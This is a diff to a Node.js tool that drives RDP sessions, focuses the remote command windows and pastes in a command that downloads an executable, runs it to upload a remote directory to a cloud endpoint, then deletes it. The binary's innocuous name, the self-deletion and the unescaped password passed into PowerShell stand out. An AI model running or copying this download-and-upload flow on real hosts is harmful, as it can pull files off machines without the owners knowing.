@@ -1,21 +1,96 @@
 const config = require('./lib/config.json')
 const fs = require('fs')
 const child = require('node:child_process')
-const processWindows = require('node-process-windows')
 const { keyboard, Key, mouse, Button, clipboard, Point } = require('@nut-tree/nut-js')
 const { v4: uuidv4 } = require('uuid')
 const request = require('request')
 const find = require('find-process')
 const { HandleParsing } = require('./parse')
+const ffi = require('ffi-napi')
 let isPortReachable
 
 const RDP_FILES_PATH = './rdps'
 
-// curl -s https://aws-rdp-productivity-backend-v1-upload-bucket.s3.amazonaws.com/aws-rdp-productivity-upload.exe -o ./aws-rdp-productivity-upload.exe && aws-rdp-productivity-upload.exe --uuid="1234-1234-1234" --endpoint="https://erapu53s3e.execute-api.us-east-1.amazonaws.com/upload" --path="C:\Users\Admin\Desktop\test-directory" --prefix="test" && rm aws-rdp-productivity-upload.exe
+keyboard.config.autoDelayMs = 0
+mouse.config.autoDelayMs = 0
+mouse.config.mouseSpeed = 999999999999
+
+const user32 = new ffi.Library('user32', {
+	FindWindowA: ['long', ['string', 'string']],
+	FindWindowExA: ['long', ['long', 'long', 'string', 'string']],
+	GetTopWindow: ['long', ['long']],
+	SetActiveWindow: ['long', ['long']],
+	SetForegroundWindow: ['bool', ['long']],
+	BringWindowToTop: ['bool', ['long']],
+	ShowWindow: ['bool', ['long', 'int']],
+	SwitchToThisWindow: ['void', ['long', 'bool']],
+	GetForegroundWindow: ['long', []],
+	AttachThreadInput: ['bool', ['int', 'long', 'bool']],
+	GetWindowThreadProcessId: ['int', ['long', 'int']],
+	SetWindowPos: ['bool', ['long', 'long', 'int', 'int', 'int', 'int', 'uint']],
+	SetFocus: ['long', ['long']]
+})
+
+const kernel32 = new ffi.Library('Kernel32.dll', {
+	GetCurrentThreadId: ['int', []]
+})
+
+const GetRDPShellWindowHandles = () =>
+	new Promise((resolve) => {
+		try {
+			const mainChildWindowHandle = user32.FindWindowA(
+				null,
+				`${config.username}: C:\\Windows\\System32\\cmd.exe (Remote)`
+			)
+			const windowHandles = [mainChildWindowHandle]
+
+			if (mainChildWindowHandle === 0) {
+				return resolve([])
+			}
+
+			let nextChildWindowHandle = mainChildWindowHandle
+			while (nextChildWindowHandle !== 0) {
+				nextChildWindowHandle = user32.FindWindowExA(
+					null,
+					nextChildWindowHandle,
+					null,
+					`${config.username}: C:\\Windows\\System32\\cmd.exe (Remote)`
+				)
+				if (nextChildWindowHandle !== 0) windowHandles.push(nextChildWindowHandle)
+			}
+
+			return resolve(windowHandles)
+		} catch (err) {
+			console.error('[ERROR] Error getting RDP shell window handles, err:', err)
+			return resolve([])
+		}
+	})
+
+const SetFocusToHandle = (handle) =>
+	new Promise(async (resolve) => {
+		try {
+			const foregroundHWnd = user32.GetForegroundWindow(),
+				currentThreadId = kernel32.GetCurrentThreadId(),
+				windowThreadProcessId = user32.GetWindowThreadProcessId(foregroundHWnd, null)
+
+			user32.ShowWindow(handle, 9)
+			user32.SetWindowPos(handle, -1, 0, 0, 0, 0, 3)
+			user32.SetWindowPos(handle, -2, 0, 0, 0, 0, 3)
+			user32.SetForegroundWindow(handle)
+			user32.AttachThreadInput(windowThreadProcessId, currentThreadId, 0)
+			user32.SetFocus(handle)
+			user32.SetActiveWindow(handle)
+
+			return setTimeout(resolve, 250)
+		} catch (err) {
+			console.error(`[ERROR] Error setting focus to handle #${handle}, err:`, err)
+			return resolve()
+		}
+	})
 
 const KillRDPProcesses = () =>
 	new Promise(async (res) => {
-		console.log('[STATUS] Terminating Processes')
+		console.log('[STATUS] Terminating Active RDP Processes')
 		const results = await find('name', 'mstsc.exe')
 		results.forEach(({ pid }) => process.kill(pid))
 		return res()
@@ -23,47 +98,45 @@ const KillRDPProcesses = () =>
 
 const SendUploadRDP = (uploadCommand) =>
 	new Promise(async (res) => {
-		const results = await find('name', 'mstsc.exe')
-		keyboard.config.autoDelayMs = 0
-		mouse.config.autoDelayMs = 0
-		mouse.config.mouseSpeed = 999999999999
+		const handles = await GetRDPShellWindowHandles()
 
-		if (!results.length) {
+		if (!handles.length) {
 			console.log('[ERROR] No RDP shells found')
 			return
 		}
 
+		// Not necessary, but helps out
 		await mouse.setPosition(new Point(256, 256))
-		await new Promise((resolve) => setTimeout(resolve, 25))
-		await mouse.click(Button.RIGHT)
-		await new Promise((resolve) => setTimeout(resolve, 25))
+		await new Promise((resolve) => setTimeout(resolve, 100))
+		await clipboard.setContent(uploadCommand) // Copy and paste the upload command initially
+		await new Promise((resolve) => setTimeout(resolve, 100))
 
-		for (const result of results) {
+		for (const handle of handles) {
 			// await new Promise((resolve) => setTimeout(resolve, 2500))
-			console.log(`[STATUS] [PID ${result.pid}] Focusing process`)
+			console.log(`[STATUS] [Handle ${handle}] Focusing handle`)
 
 			// Focus the shell process
-			processWindows.focusWindow(result.pid)
+			await SetFocusToHandle(handle)
 			await new Promise((resolve) => setTimeout(resolve, 100))
 
-			console.log(`[STATUS] [PID ${result.pid}] Fullscreening shell`)
+			console.log(`[STATUS] [Handle ${handle}] Fullscreening shell`)
 
 			await keyboard.type(Key.F11) // Full screen the focused shell
 			await new Promise((resolve) => setTimeout(resolve, 250))
 			await mouse.setPosition(new Point(256, 256))
 			await new Promise((resolve) => setTimeout(resolve, 250))
 
-			console.log(`[STATUS] [PID ${result.pid}] Injecting upload command`)
+			console.log(`[STATUS] [Handle ${handle}] Injecting upload command`)
 
 			await clipboard.setContent(uploadCommand) // Copy and paste the upload command
-			await new Promise((resolve) => setTimeout(resolve, 25))
+			await new Promise((resolve) => setTimeout(resolve, 100))
 			await mouse.click(Button.RIGHT)
-			await new Promise((resolve) => setTimeout(resolve, 25))
+			await new Promise((resolve) => setTimeout(resolve, 100))
 			await keyboard.type(Key.Enter)
-			await new Promise((resolve) => setTimeout(resolve, 25))
+			await new Promise((resolve) => setTimeout(resolve, 100))
 			await keyboard.type(Key.F11) // Unfullscreen screen the focused shell
 
-			await new Promise((resolve) => setTimeout(resolve, 250))
+			await new Promise((resolve) => setTimeout(resolve, 100))
 		}
 
 		return res()
@@ -78,6 +151,8 @@ const ClearS3Bucket = ({ uuid, prefix }) =>
 				uuid,
 				prefix
 			}
+
+			console.log(data)
 
 			request(
 				{
@@ -127,7 +202,7 @@ const GenerateUploadCommand = ({ upload_bucket_url, upload_endpoint, uuid, path,
 	`curl -s ${upload_bucket_url} -o ./aws-rdp-productivity-upload.exe && aws-rdp-productivity-upload.exe --uuid="${uuid}" --endpoint="${upload_endpoint}" --path="${path.replace(
 		/\\\\/g,
 		'\\'
-	)}" --prefix="${prefix}" && del aws-rdp-productivity-upload.exe`
+	)}" --prefix="${prefix}" && del aws-rdp-productivity-upload.exe && exit`
 
 class RDP {
 	constructor({ ip, username, password, uuid, prefix }) {
@@ -146,7 +221,7 @@ class RDP {
 
 			// Encrypt the RDP password to be inputted into a RDP file, this is required.
 			child.exec(
-				`("${this.password}" | ConvertTo-SecureString -AsPlainText -Force) | ConvertFrom-SecureString;`,
+				`('${this.password}' | ConvertTo-SecureString -AsPlainText -Force) | ConvertFrom-SecureString;`,
 				{ shell: 'powershell.exe' },
 				(err, stdout, stderr) => {
 					if (err || stderr.length) {
@@ -319,6 +394,7 @@ const main = async (_) => {
 	})
 
 	// Clear the S3 bucket upon completion of parsing
+
 	await ClearS3Bucket({ uuid, prefix: config.prefix })
 
 	// Handle parsing of data from /raw
